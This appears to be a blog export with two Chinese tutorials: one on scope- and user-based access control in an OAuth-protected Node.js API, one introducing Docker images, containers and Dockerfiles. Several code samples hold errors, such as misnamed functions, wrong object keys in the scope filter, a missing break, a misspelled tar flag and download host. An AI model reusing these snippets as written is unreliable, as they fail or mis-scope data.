不同权限对应不同的操作不同类型的操作需要不同的权限范围，才能使调用成功。这使得资源服务器可以根据客户端能执行的操作来划分功能。这也是单个授权服务器对应的多个资源服务器之间使用单个令牌的常用方法。 客户端有一个页面提供访问资源API的所有功能，读取显示并带上时间戳，用于资源服务器上添加新单词，删除功能等 应用中注册了三个路由，分别对应不同的动作，只要传入的令牌有效，无论什么类型，都会执行 123456789101112131415161718app.get('/words',getAccessToken,requireAccessToken,(req,res)=&gt;&#123; res.json(&#123; words:saveWords.json(' '), timestamp:Date.now() &#125;)&#125;)app.post('/words',getAccessToken,requireAccessToken,(req,res)=&gt;&#123; if(req.body.word)&#123; saveWords.push(req.body.word) &#125; res.status(201).end();&#125;)app.delete('/words',getAccessToken,requireAccesToken,(req,res)=&gt;&#123; saveWords.pop() res.status(204).end;&#125;) 现在，逐个修改它们，确保令牌中至少包含与各个功能对应的权限范围，鉴于在数据库中存储方式，需要获取令牌对应的scope成员，对于GET功能，我们需要客户端拥有与之对一个的read权限范围，客户端还可以拥有其他权限范围 1234567891011app.post('/words', getAccessToken, requireAccessToken, (req, res) =&gt; &#123; if (__.contains(req.access_token.scope, 'write')) &#123; if (req.word.word) &#123; saveWords.push(req.body.word) &#125; res.status(201).end() &#125; else &#123; res.set('WWW-Authenticate', 'Bearer realm=localhost:9002,error="insufficient_scope",scope="write"'); res.status(403) &#125;&#125;) 使用 WWW-Authenticate头部返回错误，告诉客户端该资源需要接受一个OAuth bearer令牌，并且令牌中至少要包含read权限范围，才能调用成功。在另外两个函数中加入类似的代码，也会检查write,delete的权限范围，在任何情况下，即使令牌有效，只要权限范围不正确，就会返回错误： 12345678910111213141516171819202122app.post('/words', getAccessToken, requireAccessToken, (req, res) =&gt; &#123; if (__.container(req.access_token.scope, 'write')) &#123; if (req.word.word) &#123; saveWords.push(req.body.word) &#125; res.status(201).end() &#125; else &#123; res.set('WWW-Authenticate', 'Bearer realm=localhost:9002,error="insufficient_scope",scope="write"'); res.status(403) &#125;&#125;)app.delete('/words', getAccessToken, requireAccessToken, (req, res) =&gt; &#123; if (__.container(req.access_token.scope, 'delete')) &#123; saveWords.pop() res.status(204).end() &#125; else &#123; res.set('WWW-Authenticate', 'Bearer realm=localhost:9002,error="insufficient_scope",scope="delete"'); res.status(403) &#125;&#125;) 这样一来，要为客户端指定不同的权限范围组合，需要重新对客户端应用授权 不同的权限范围对应不同的数据结果在这种风格的API设计中，同一个处理函数可以根据传入的令牌中包含的权限范围不同，而返回不同类别的信息。如果数据结构复杂，且希望通过同一个API端点为客户端提供多种信息子集的访问，这样设计就非常有用。 在受保护资源没有为不同的农产品类别提供多个独立的处理函数，而是在一个处理函数中处理对所有农产品的请求，这个处理函数返回的对象中包含所有种类的农产品列表 12345678app.get('/produce',getAccessToken,requireAccessToken,(req,res)=&gt;&#123; const produce = &#123; fruit:['apple','banana','kiwi'], veggies:['lettuce','onion','potato'], meats:['bacon','steak','chicken breast'] &#125; res.json(produce)&#125;) 在做修改之前，使用有效的令牌访问该API,会得到包含所有农产品的列表，如果对客户端授权让它得到访问令牌，但是不勾选任何权限范围，就会得到所有数据。 切分数据结构，将数据片段放入控制语句，检查每个农产品类别的权限范围 12345678910111213141516const produce = &#123; fruit:[], veggies:[], meats:[]&#125;if(__.contains(req.access_token.scope,'fruit'))&#123; Object.assign(produce,&#123;fruit:['apple','banana','kiwi']&#125;)&#125;if(__.contains(req.access_token.scope,'veggies'))&#123; Object.assign(produce,&#123;fruit:['lettuce','onion','potato']&#125;)&#125;if(__.contains(req.access_token.scope,'meats'))&#123; Object.assign(produce,&#123;fruit:['bacon','steak','chicken breast']&#125;)&#125; 不同用户对应不同的数据结果同一个处理函数可以根据授权客户端的用户不同的信息。这是一种常见的API设计方式，使得客户端应用在不知道用户是谁的情况下，调用同一个URL也能获取个性化的结果。虽然客户端与受保护资源之间建立的连接上并没有资源拥有者的登录或者身份认证信息，但是生成的令牌中包含资源拥有者的信息，资源拥有者需要在授权批准的环节进行身份认证。 授权服务器的批准页面会选择替哪个用户授权，通常这一步是通过授权服务器对资源拥有者进行身份认证来完成的，而且一般认为运行一个未经身份认证的用户随意冒充任何人是极不安全的做法。 我们要做的就是根据授权者是谁来返回对应的数据，授权服务器已经讲资源拥有者的用户名存在访问令牌记录的user字段中，根据这个字段确定返回内容 123456789101112131415161718app.get('/favorites', getAccessToken, requireAccessToken, (req, res) =&gt; &#123; const &#123; access_token: &#123; user &#125; &#125; = req; const unknown = &#123; user: 'Unknown', favorites: &#123; movies: [], foods: [] &#125; &#125; switch (user) &#123; case 'alice': res.json(&#123; user: 'Alice', favorites: aliceFavorites &#125;) break; case 'bob': res.json(&#123; user: 'Bob', favorites: bobFavorites &#125;) default: res.json(unknown) &#125;&#125;) 在授权服务器上以Alice或者Bob名义授权了客户端，就会在客户端上得到他们的个性化数据。 在OAuth处理流程中，客户端绝不知道与之交互的是Alice还是Bob或者其他的。客户端只是碰巧知道了Alice的名字，因为它调用的API的响应包含了她的名字，而这个人信息也很容易被去掉。这是一个重要的设计模式，因为它可以避免不必要的暴露资源拥有者的个人身份信息，从而保护隐私。如果与分享信息的API结合起来，可以用OAuth构建一个身份认证协议。 额外的访问控制使用OAuth能对受保护资源实现的访问控制远不止上面那些，而且当今使用OAuth的受保护资源都有各自的应用模式。因此，OAuth并不插手授权决策的过程，而只通过使用令牌和权限范围充当授权信息的载体。这样的设计思路使得OAuth广泛应用于互联网上各种类型的API. 资源服务器可以根据令牌及其附属信息（如权限范围）直接作出授权决策。资源服务器还可以将访问令牌中的权限范围与其他访问控制信息结合起来，用于决定是否响应API调用已经响应什么内容。例如,资源服务器可以限制特定的客户端和用户只能在特定的时间段内访问资源，无论令牌是否有效。资源服务器甚至可以以令牌作为输入，调用外部策略引擎，以实现组织内对复杂授权规则的集中管理。 在任何情况下，资源服务器都对访问令牌的含义拥有最终决定权，不管资源服务器外包了多少决策过程，最终都由它来决定如何处理给定请求。 小结使用OAuth保护Web Api非常简单： 从传入的请求中解析出令牌 通过授权服务器验证令牌 根据令牌的权限范围作出响应，令牌的权限范围有多种。 第五章：构建简单的OAuth授权服务器上面构建了OAuth客户端应用，可以从授权服务器获取令牌，并使用令牌访问受保护资源，还构建了一个供用户访问的受保护资源，下面构建了一个简单的授权服务器，支持授权码许可类型，这个组件要管理客户端，执行OAuth核心的授权操作，还要向客户端颁发令牌 授权服务器是OAuth生态系统中最复杂的组件，是整个OAuth系统的安全权威中心。只有授权服务器能够给用户进行身份认证，注册客户端，颁发令牌。在OAuth2.0规范的制定过程中，已经尽可能将复杂性从客户端和受保护资源转移到授权服务器。这很大程度是由各个组件的数量决定的：客户端的数量远多于受保护资源的数量，受保护资源的数量又远多于授权服务器的数量。 管理OAuth客户端注册]]></content>
      <categories>
        <category>nodejs实战</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker从入门到实践]]></title>
    <url>%2F2020-07-07-docker.html</url>
    <content type="text"><![CDATA[docker学习，作者源于这里 Docker基本概念镜像Image操作系统分为内核和用户空间，内核启动后，会挂载root文件系统为其提供用户空间支持。docker镜像就相当于是一个root文件系统。 是一个特殊文件系统，除了提供容器运行所需的程序、库、资源、配置等文件外，还包含一些为运行准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像不会包含任何动态数据，其内容在构建之后也不会被改变 分层存储镜像包含操作系统完整的root文件系统，体积庞大，在设计docker时，将其设计为分层存储架构。严格来说，镜像并非像一个ISO那要的打包文件，镜像只是一个虚拟概念，实际体现并非由一个文件组成，而是由一组文件系统组成，或说是多层文件系统联合组成。 镜像构建时，会一层层构建，前一层是后一层的基础，每一层构建完就不会再发生改变，后一层上的任何改变只发生在自己的这一层。例如删除前一层文件的操作并不是真的删除前一层文件，而是仅在当前层标记为该文件已珊瑚虫。在最终容器运行时候，虽然不会看到这个文件，但是实际上该文件会一直跟随镜像。因此在构建镜像的时候，需要额外小心，每一层尽量只包含该层需要添加的东西，任何额外的东西应该在该层构建结束前清理掉 分层存储的特性还使得镜像的复用、定制变得更加容易，甚至可以使用之前构建好的镜像作为基础层，然后进一步添加新的层，以定制自己所需的内容，构建新的镜像 容器Container镜像和容器的关系，就像是面向对象程序中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容易可以被创建、启动、停止、删除、暂停等。 容器的实质是进程，但与直接在宿主执行的进程不同，容器进程运行属于自己的独立的命名空间。因此容器可以拥有自己的root文件系统、自己的网络配置、自己的进程空间，设置自己的用户ID空间。容器内的进程是运行在一个隔离的环境里面，使用起来，就好像是在一个独立于宿主的系统下操作一样。这种特性使得容器封装的应用比直接在宿主运行更加安全。因为这种隔离特性，常常会混淆容器和虚拟机。 容易也是分层存储，每一个容器运行时，是以镜像为基础层，在其上创建一个当前容器的存储层，称这个为容器运行时读写而装备的存储层为容器存储层。 容器存储层的生存周期和容器一样，容器消亡时，容器存储层随之消亡。任何保存于容器存储层的信息都会随容器删除而丢失。 按照最佳实践的要求，容器不应该向其存储层内写入任何数据，容器存储层要保持无状态化。所有文件写入操作，都应该使用数据卷、或者绑定宿主目录，在这些位置的读写会跳过容器存储层，直接对宿主（或网络存储）发生读写，其性能和稳定性更高。 数据卷的生存周期独立容器，使用数据卷后，容器删除或者重新运行之后，数据不会丢失。 仓库Repository镜像构建后，容易在当前宿主机上运行，但是如果需要在其他服务器上使用这个镜像，就需要一个集中的存储、分发镜像的服务，docker register就是这样的服务。一个docker regisert中可以包含多个仓库，仓库可以包含多个标签Tag,每个标签对应一个镜像。 通常一个仓库会包含同一个软件不同版本的镜像，而标签就常用于对应该软件的各个版本。可以通过&lt;仓库名&gt;:&lt;标签&gt;的格式指定具体这个软件哪个版本的镜像。如果不给出标签，将以lasest作为默认版本。 使用镜像获取镜像 docker pull [选项] [Docker Register 地址[:端口号]/]仓库名[:标签] 可通过docker pull --help命令看到。镜像名称格式： Docker 镜像仓库地址：地址的名称一般是&lt;域名/IP&gt;[:端口号]默认地址是Docker Hub 仓库名：仓库名是两段式名称，即&lt;用户名&gt;/&lt;软件名&gt;。对于Docker Hub不给出用户名，默认就是 library，也就是官方镜像 例如： 123456789[1;32mdocker@default[0m:[1;34m~[0m$ docker pull ubuntu:16.0416.04: Pulling from library/ubuntu[1B8bd67045: Pulling fs layer[1Be4862c05: Pulling fs layer[1B8949dcb1: Pulling fs layer[1BDigest: sha256:69bc24edd22c270431d1a9e6dbf57cfc4a77b2da199462d0251b145fdd7fa538Status: Downloaded newer image for ubuntu:16.04 上面命令没有给出docker镜像仓库地址，会从Docker Hub获取镜像，镜像名称是ubuntu:16.04,因此获取官方镜像library/ubuntu，仓库中标签为 16.04的镜像 下载过程中可以看出分层存储概念，镜像由多层存储所构成，下载也是一层层的去下载，并非单一文件。下载过程中给出每一层ID的前12位，并且下载结束后，给出该镜像sha256的完整摘要，以确保下载一致性 运行以镜像为基础启动并运行一个容器，启动里面的bash并镜像交互操作 1234567891011121314151617[1;32mdocker@default[0m:[1;34m~[0m$ [Kdocker run -it --rm ubuntu:16.04 bash# 查看当前系统版本[K]0;root@0d248af097b5: /root@0d248af097b5:/# cat /etc/os-releaseNAME="Ubuntu"VERSION="16.04.6 LTS (Xenial Xerus)"ID=ubuntuID_LIKE=debianPRETTY_NAME="Ubuntu 16.04.6 LTS"VERSION_ID="16.04"HOME_URL="http://www.ubuntu.com/"SUPPORT_URL="http://help.ubuntu.com/"BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"VERSION_CODENAME=xenialUBUNTU_CODENAME=xenial# 退出]0;root@0d248af097b5: /root@0d248af097b5:/# exitexit docker run是容器运行的命令： -it:这是两个参数，也给是-i，交互式操作，一个是-t终端。进入bash执行一些命令并查看返回结果，因此需要交互式终端 --rm：容器退出后随之将其删除。默认情况下，为了排障需求，退出的容器并不会立即删除，除非手动docker rm。这里使用 --rm可以避免浪费空间，只是随便执行个命令，查看结果，不需要排障和保留结果 ubuntu:16.64：这是用这个镜像为基础来启动容器 bash：在镜像后的是命令，希望有个交互式的shell，使用的是bash 列出镜像docker image ls 12345[1;32mdocker@default[0m:[1;34m~[0m$ docker image lsREPOSITORY TAG IMAGE ID CREATED SIZEubuntu 16.04 c522ac0d6194 8 hours ago 126MBnginx latest 2622e6cca7eb 3 weeks ago 132MBhello-world latest fce289e99eb9 18 months ago 1.84kB 列表包含了仓库名、标签、镜像ID、创建时间以及所占空间。 镜像ID是镜像的唯一标识，一个镜像可以对应多个标签。 镜像体积这里标识所占的空间和在Docker Hub上看到的镜像大小不一样，这是因为Docker Hub中显示的体积是压缩后的体积。在镜像下载和上传过程中镜像总是保持着压缩状态，因此Docker Hub中显示的大小是网络传输中更关心的流量大小，而docker image ls显示的是镜像下载到本地后展开的大小，是展开后的各层所占空间的总和，因此镜像到本地后，查看空间的时候，更关心的是本地磁盘空间所用的大小。 列表中的镜像体积总和并非是所有镜像实际硬盘消耗，由于docker 镜像是多层存储结构，并且可以继承、复用，因此不同镜像可能会因为使用相同的基础镜像，从而拥有共同的层。由于Docker使用UnionFS，相同层只需要保存一份即可，因此实际镜像硬盘占用空间很可能要比这个列表镜像大小的总和要小的多。 使用 docker system df查看镜像、容器、数据卷所占用的空间 123456[1;32mdocker@default[0m:[1;34m~[0m$ docker system dfTYPE TOTAL ACTIVE SIZE RECLAIMABLEImages 3 1 258.2MB 258.2MB (99%)Containers 1 0 0B 0BLocal Volumes 0 0 0B 0BBuild Cache 0 0 0B 0B 虚悬镜像有时候会特殊镜像，既没有仓库名，也没有标签，为none 1&lt;none&gt; &lt;none&gt; 09089dhs989 5 days ago 23MB 这些镜像原来是镜像名和标签的，随着官方镜像维护发布新版本，重新pull这个镜像，镜像名被转移到了新下载的镜像上，而旧的镜像上的名称则被取消，从而成为了&lt;none&gt;。docker build也可能导致这样的问题。由于新旧镜像同名，旧镜像名称被取消，从而仓库名、标签均为&lt;none&gt;。这类无标签镜像也被成为虚悬镜像（dangling image）,可以用docker image ls -f dangling=true显示这些镜像 虚悬镜像也是失去了存在价值，可以随意删除，用docker image prune删除 中间层镜像为了加速镜像构建、重复利用资源，Docker会利用中间镜像，在使用一段时间后，会看到一些依赖的中间镜像。默认的docker image ls列表只会显示顶层镜像，如果希望显示中间层镜像在内的所有镜像的话，用docker image ls -a 出现无标签镜像，与虚悬镜像不同，这些镜像都是中间层镜像，是其他镜像所依赖的镜像，删除这些镜像会导致上层镜像因为依赖丢失出错。删除那些依赖它们的镜像后，这些依赖的中间层镜像也会被连带删除 列出部分镜像12345678910111213# 根据仓库名docker image ls ubuntu# 指定仓库名和标签docker image ls ubuntu:16.04# 过滤器参数--filter,简写-f,希望看到在mongo:3.2之后建立的镜像docker image ls -f since=mongo:3.2# 之前则是用before# 如果镜像构建时，定义了LABEL,可通过LABEL过滤docker image ls -f label=com.example.version=0.1 特定格式显示123456789101112131415# 将所有镜像的ID列出docker image ls -q# 列出镜像结果只包含镜像ID和仓库名，使用了GO模板语法docker image ls --format "&#123;&#123;.ID&#125;&#125;: &#123;&#123;.Repository&#125;&#125;"c522ac0d6194: ubuntu2622e6cca7eb: nginxfce289e99eb9: hello-world# 以表格等距显示，并且有标题行，和默认一样，不过自己定义列docker image ls --format "table &#123;&#123;.ID&#125;&#125;\t&#123;&#123;.Repository&#125;&#125;\t&#123;&#123;.Tag&#125;&#125;"IMAGE ID REPOSITORY TAGc522ac0d6194 ubuntu 16.042622e6cca7eb nginx latestfce289e99eb9 hello-world latest 删除本地镜像1docker image rm [选项] &lt;镜像1&gt;[&lt;镜像2&gt;...] ID、镜像名、摘要删除镜像 镜像可以是短id,长id,镜像名或者镜像摘要，短id取前3个字符以上，能区分别的镜像就可以 12345678910111213141516docker image rm 502# 用镜像名，&lt;仓库名&gt;:&lt;标签&gt;docker image rm centos# 显示镜像摘要docker image ls --digests# 使用镜像摘要删除镜像docker image rm node@sha256:b4f0e0bdeb578043c1ea6862f0d40cc4afe32a4a582f3be235a3b164422be228# 删除所有仓库名为redis的镜像docker image rm $(docker image ls -q redis)# 删除所在mongo:3.2之前的镜像docker image rm$(docker image ls -q -f before=mongo:3.2) Untagged和Deleted删除行为分为两种，一种是untagged，一种是deleted。镜像的唯一标识是其ID和摘要，而一个惊喜可以有多个标签。当我们删除指定标签后，可能还有别的标签指向这个镜像，那么delete行为不会发生，会显示untagged信息。 当该镜像所有标签都被取消了，改镜像可能就失去了存在的意义，因此会触发删除行为。镜像是多层存储结构，在删除的时候也是从上层向基础层方法依次进行判断删除。镜像的多层结构使得复用变动镜像容易，因此很有可能某个其他镜像正依赖当前镜像的某一层。这种情况不会触发删除该层行为。直到没有任何层依赖当前层时，才会真实删除当前层。 除了镜像依赖还有容器对镜像的依赖。如果有用这个镜像启动的容器存在，即使容器没有运行，那么同样不可以删除这个镜像。容器是以经为基础，再加一层容器存储层，组成这样的多层存储结构去运行。因此该镜像如果被这个容器所依赖，那么删除必然会导致故障。如果这些容器是不需要的，应该先将它们删除，然后来删除镜像。 利用commit理解镜像构成镜像是容器的基础，每次执行docker run的时候都会指定哪个镜像作为容器运行的基础。当Docker Hub的镜像无法满足需求时，我们就需要定制镜像。 定制Web服务器为例子 12345678# nginx镜像启用一个容器，命名为webserver,映射80端口，在浏览器可以访问这个nginx服务器docker run --name webserver -d -p 80:80 nginx# 修改欢迎页面,以交互式终端方式进入webserver容器，并执行bash命令，获得一个可操作的shell，使用新内容覆盖指定文件的内容docker exec -it webserver bashroot@xxx: /# echo '&lt;h1&gt;Hello,Docker!&lt;/h1&gt;' &gt; /usr/share/nginx/html/index.htmlroot@xxx: /# exitexit 修改了容器文件，也就是改动了容器的存储层，通过 docker diff可以看到具体的改变 定制好变化后，保存下来形成镜像。当我们运行一个容器（不使用卷），我们做的任何文件修改都会被记录于容器存储层里。而docker提供了docker commit命令，可以将容器的存储层保存下来成为镜像。在原有镜像的基础上，再叠加上容器的存储层，并构成新的镜像。以后我们运行这个新镜像的时候，就会拥有原来容器最后的文件变化 docker commit [选项] &lt;容器ID或容器名&gt; [&lt;仓库名&gt;[:&lt;标签&gt;]] 12# 将容器保存为镜像docker commit --author "Laibh &lt;544289495@qq.com&gt;" --message "修改默认页面" webserver nginx:v2 接着 1234# 查看新定制的镜像并使用，也可以使用docker history具体查看镜像内的历史记录docker image ls docker run --name web2 -d -p 81:80 nginx:v2 使用 docker commit 命令可以直观帮助理解镜像分层存储概念，但是实际环境不会这么做。 仔细观察docker diff webserver的结果，会发现除了修改的文件外，由于命令的执行，还有很多文件被改动或者添加了，这仅仅是最简单的操作，如果是安装软件包、编译构建，那会有大量的无关内容被添加进来，如果不小心清理，将会导致镜像尤为臃肿。 此外，使用docker commit都是黑箱操作。只有制作者才知道做了什么，docker diff可以看出一些线索，但不能保证生成一致的镜像。 Dockerfile定制镜像dockerfile是一个文本文件，其内包含了一天天的指令（Instruction）,每一条指令构建一层，因此每一条指令的内容就是描述该层应当如何构建 在一个空白目录，建立一个文件夹，并命名为Dockerfile 1234567mkdir myngixcd mynginx touch Dockerfilevi Dockerfile# 内容为FROM nginxRun echo '&lt;h1&gt;Hello,Docker!&lt;/h1&gt;' &gt; /usr/share/nginx/html/index.html FROM指定基础镜像定制镜像是以一个镜像为基础，在其上进行定制，FROM就是指定基础镜像，因此FROM是Dockerfile文件的第一条指令，除了docker hub现有的镜像，还有一个特殊的镜像 scratch，虚拟镜像，表示一个空白的镜像 FROM scratch 以它为基础的话，意味着不以任何镜像为基础，接下来写的指令作为镜像的第一层开始存在。不以任何系统为基础，直接将可执行文件复制进镜像的做法不罕见，对于Linux下静态编译的程序来说，并不需要有操作系统提供运行时支持，所需的一切库都已经在可执行文件里了，因此直接FROM scratch会让镜像体积更加小巧。使用GO语言开发的引用会使用这种方式，这也是为什么说Go是特别适合容器微服务架构的语言的原因之一 RUN指定命令RUN指令是定制镜像最常见的指令之一。格式有两种： shell格式：RUN&lt;命令&gt;，就像直接在命令行输入的命令一样 exec格式：RUN[&quot;可执行命令&quot;,&quot;参数1&quot;,&quot;参数2&quot;]，这更像是函数调用中格式 123456789FROM debian:jessieRUN apt-get updateRUN apt-get install -y gcc libc6-dev makeRUN wget -O redis.tar.gz "http://download.redios.io/release/redis-3.2.5.tar.gz"RUN mkdir -p /usr/src/redisRUN tar -xzf redis.tar.gz -C /usr/src/redis --script-components=1RUN make -C /usr/src/redisRUN make -C /usr/src/redis install dockerfile中每个指令都会建立一层，RUN也不例外，每一个RUN的行为都会新建一层，在其上执行结果后，commit一层的修改，构成新的镜像，上面这种写法创建了7个镜像，这是完全没有意义的，运行时很多不需要的东西都被装进了镜像，比如编译、更新的软件包等，结果就是产生臃肿、非常多层的镜像，不仅增加了构建时间，也容易出错。UnionFS是有最大层数限制的，比如AUFS,曾经是最大不超过42层，现在是不超过127层。 上面的Dockerfile正确写法应该是： 1234567891011121314FROM debian:jessieRUN buildDeps='gcc libc6-dev make' \ &amp;&amp; apt-get update \ &amp;&amp; apt-get install -y $buildDeps \ &amp;&amp; wget -O redis.tar.gz "http://download.redios.io/release/redis-3.2.5.tar.gz" \ &amp;&amp; mkdir -p /usr/src/redis \ &amp;&amp; tar -xzf redis.tar.gz -C /usr/src/redis --script-components=1 \ &amp;&amp; make -C /usr/src/redis \ &amp;&amp; make -C /usr/src/redis install \ &amp;&amp; rm -rf /var/lib/apt/lists/* \ &amp;&amp; rm redis.tar.gz \ &amp;&amp; rm -r /usr/src/redis \ &amp;&amp; apt-get purge -y --auto-remove $buildDeps 之前所有命令的目的只有一个，就是编译、安装redis可执行文件。因此没有必要建立多层，这里仅使用一个RUN，并使用 &amp;&amp;将各个需要命令串联起来，将之前的7层变成1层。并且为了格式化还进行了换行。Dockerfile支持Shell类的行尾添加 \的命令行，以及行首 #进行注释的格式。良好的格式会让排障更加容易。 此外，上面的命令还进行了清理工作，删除了为了编译构建所需要的软件，清理了所有下载、展开的文件，并且还清理了apt缓存文件，在镜像构建过程要确保每一层只添加真正需要添加的东西，任何无关的东西都应该被清理掉。 构建镜像在Dockerfile文件所在目录执行： 1234567891011docker@default:~/mynginx$ docker build -t nginx:v3 .Sending build context to Docker daemon 2.048kBStep 1/2 : FROM nginx ---&gt; 2622e6cca7ebStep 2/2 : RUN echo '&lt;h1&gt;Hello,Docker!!!&lt;/h1&gt;' &gt; /usr/share/nginx/html/index.html ---&gt; Running in 6b7204234c09Removing intermediate container 6b7204234c09 ---&gt; 4021436fa2edSuccessfully built 4021436fa2edSuccessfully tagged nginx:v3# 在Step2中，RUN启动了一个容器6b7204234c09，执行了要求的命令，并提交了这一层4021436fa2ed，删除所用到的容器RUN启动了一个容器6b7204234c09 docker build格式： docker build [选型] &lt;上下文路径/URL/-&gt; 镜像构建上下文（Context）docker build 命令最后一个 .，代表当前目录，而Dockerfile就在当前目录，所以会误以为这个路径是指定Dockerfile所在路径，这样的理解不准确，其实这是在指定上下文路径。 docker build的工作原理：Docker在运行时分为Docker引擎（也就是服务端守护进程）和客户端工具。Docker的引擎提供了一组REST API,被称为Docker Remote API，而docker命令这样的客户端工具，则是通过这组API与Dokcer引擎交互，从而完成各种功能。因此我们表面上好像在本机执行各种docker功能，实际上，一切都是使用的远程调用形式在服务端（Docker引擎）完成。也因为这种C/S设计，让我们操作远程服务器的Docker引擎变得轻而易举。 当我们进行镜像构建时，并非所有的定制都会通过RUN指令完成，经常会需要将一些本地文件复制进镜像，比如通过COPY指令，ADD指令。而docker build命令构建镜像，并非在本地构建，而是在服务端，也就是Docker引擎中构建。那么在这种客户端/服务端的架构中，如何才能让服务端获得本地文件呢？ 这就引入了上下文概念，当构建的时候，用户会指定构建镜像上下文路径，docker build命令得知这个路径后，会将路径下的所有内容打包，然后上传给Docker引擎，这样Docker引擎收到这个上下文之后，展开就会获得构建镜像所需要的一切文件。 例如在Dockerfile这样写： COPY ./package.json /app/ 这并不是要复制执行docker build命令所在的目录下的package.json，也不是复制Dockerfile所在目录下的package.json,而是复制上下文context目录下的package.json 因此，COPY这类指令中的源文件的路径都是相对路径，如果真的需要那些文件，应该将它们复制到上下文目录中去。观察docker build输出，可以看到这个发送上下文的过程： 12docker@default:~/mynginx$ docker build -t nginx:v3 .Sending build context to Docker daemon 2.048kB 理解构建上下文对于镜像构建很重要，避免犯一些不应该的错误，比如初学者在发现 Copy/opt/xxxx /app不工作后，干脆把Dockerfile放到了硬盘跟目录去构建，结果发现docker build执行后，在发送一个几十GB的东西，极为缓慢而且容易构建失败，那是因为这种做法是让docker build打包整个硬盘，这显然是使用错误。 一般来说，应该会将Docker置于一个空目录，或者根目录下面，如果该目录下没有所需文件，那么应该把所需文件复制一份过来。如果目录下有些东西确实不希望构建时传给Docker引擎，那么可以用.dockerignore剔除不需要作为上下文传递给Docker引擎的。 在默认情况下，如果不额外指定Dockerfile的话，会将上下文目录下的名为Dockerfile的文件作为Dockerfile，实际上不要求名字必须为Dockerfile，并且不要求必须位于上下文目录中，比如用 -f ../Dockerfile.php参数指定某个文件作为 Dockerfile 其他Docker build用法直接用 git repo进行构建docker build还支持从URL构建，比如从 Git repo 123456789# 指定构建所需要的git repo，并且指定默认的master分支，构建目录为/814/，然后docker就会自己去git clone这个项目、切换到指定分支，并进入到指定目录后开始构建docker build https://github.com/twang2218/gitlab-ce-zh.git#:8.14docker build https://github.com/twang2218/gitlab-ce-zh.git\#:8.14Sending build context to Docker daemon 2.048 kBStep 1 : FROM gitlab/gitlab-ce:8.14.0-ce.08.14.0-ce.0: Pulling from gitlab/gitlab-ceaed15891ba52: Already exists773ae8583d14: Already exists... 用tar压缩包构建1docker build http://server/context.tar.gz 如果给出的URL不是Git repo，而是个tar压缩包，那么Docker引擎会下载这个包，并自动解压，以其作为上下文，并且构建。 从标准输入中读取Dockerfile进行构建 docker build - &lt; Dockerfile 或者 cat Dockerfile | docker build - 如果标准输入传入的是文本文件，则将其视为Dockerfile，并开始构建。这种形式由于直接从标准输入中读取Dockerfile的内容，没有上下文，因此不可以像其他方法那样可以将本地文件COPY进镜像之类的事情 从标准输入中读取上下文压缩包镜像构建 docker build - &lt; context.tar.gz 如果发现标准输入的文件格式是 gzip/bzip2/xz的话，将会使其成为上下文压缩包，直接将其展开，将里面视为上下文，并开始构建。 指令详解COPY复制文件格式： COPY &lt;源路径&gt;...&lt;目标路径&gt; COPY[&quot;&lt;源路径1&gt;&quot;,...&quot;&lt;目标路径&gt;&quot;] 和RUN指令一样，也有两种格式，一种类似于命令行，一种类似于函数调用 COPY指令将从构建上下文目录中&lt;源路径&gt;的文件/目录复制到新的一层的镜像内的&lt;目标路径&gt;位置，比如： 1COPY package.json /usr/src/app/ 源路径可以是多个，甚至是通配符，其通配符规则要满足GO的filepath.Match规则，如： 12COPY hom* /mydir/COPY hom?.txt /mydir/ &lt;目标路径&gt;可以是容器内的绝对路径，也可以是相对于工作目录的相对路径（工作路径可以用WORKDIR指令来指定）。目标路径不需要事先创建，如果目录不存在会在复制文件前先行创建缺失目录。 此外，还有一点使用COPY指令，源文件的各种元数据都会保留。比如读、写、执行权限、文件变更时间等。这个特性对于镜像定制很有用，特别是构建相关文件都在使用Git进行管理时。 ADD更高级的复制文件ADD指令和COPY的格式和性质基本一致，但是在COPY基础上增加了一些功能。 比如 &lt;源路径&gt;可以是一个URL,这种情况下Docker引擎会视图去下载这个链接的文件放到 &lt;目标路径&gt;去。下载后的文件权限自动设置为600，如果这并不是想要的权限，还要增加额外的一层RUN进行权限调整。另外，如果下载但是个压缩包，需要解压缩，也一样需要额外的一层RUN指令进行解压缩。所以不如直接使用RUN,然后用wget或者curl工具下载，处理权限、解压缩、然后清理无用文件更合理。因此这个功能其实并不好用，而且不推荐使用 如果&lt;源路径&gt;为一个tar压缩文件，压缩格式为gzip,bzip2以及xz的情况下，ADD指令将会自动解压缩这个压缩文件到 &lt;目标路径&gt;去。 在某些情况下，这个自动解压功能非常有用，比如官方镜像ubuntu中 12FROM scratchADD ubuntu-xenial-core-cloudimg-amd64-root.tar.gz / 在某些情况下，希望复制压缩文件而不解压就不用ADD命令了，在Dockerfile最佳实践文档中要求，尽可能使用COPY，因为它的语义很明确，就是复制文件而已，而ADD则包含了更复杂的功能，其行为也不一定很清晰。最适合用ADD的场合就是所提及的需要自动解压缩的场合。ADD指令会令镜像构建缓存失败，从而可能会令镜像构建变得比较缓慢。 因此COPY与ADD指令选择可以遵循这样的原则，所有文件复制均使用COPY指令，仅在需要自动解压缩的时候使用ADD CMD容器启动命令CMD 指令格式和 RUN相似，也是两种格式： shell格式：CMD&lt;命令&gt; exec格式：CMD[“可执行文件”，“参数1”,”参数2”…] 参数列表格式：CMD[“参数1”,”参数2”]。在指定了ENTRYPOINT后，用CMD指定具体参数 Docker不是虚拟机，容器就是进程，在启动容器的时候，需要指定所运行的程序及参数。CMD指令就是用指定默认的容器主进程的启动命令。 在运行时可以指定新的命令来提点镜像设置中的这个默认命令，比如ubuntu镜像默认的CMD是/bin/bash，如果我们直接docker run -it ubuntu的话，会直接进入bash，也可以在运行的时候指定运行别的命令，如 docker run -it ubuntn cat /etc/os-release，这里就是使用cat /etc/os-release命令替换了默认的 /bin/bash命令，输出了系统版本信息。 在指令格式上，一般推荐 exec格式，这类格式在解析时会被解析为JSON数组，因此一定要使用双引号，而不是单引号。使用shell的话，实际的命令会被包装为sh-c的参数的形式进行执行，比如： CMD echo \$HOME =》 CMD[“sh”,”-c”,”echo \$HOME”] 这就是为什么可以使用环境变量的原因，因此这些环境变量会被shell进行解析处理。 Docker不是虚拟机，容器的应用都应该是以前台运行，而不是像虚拟机、物理机用upstart/systemd去启动后台服务，容器没有后台服务概念。一些人将CMD写为： CMD service nginx start 然后发现容器执行后立即退出了，甚至在容器内去使用systemtcl命令结果却发现根本执行不了。 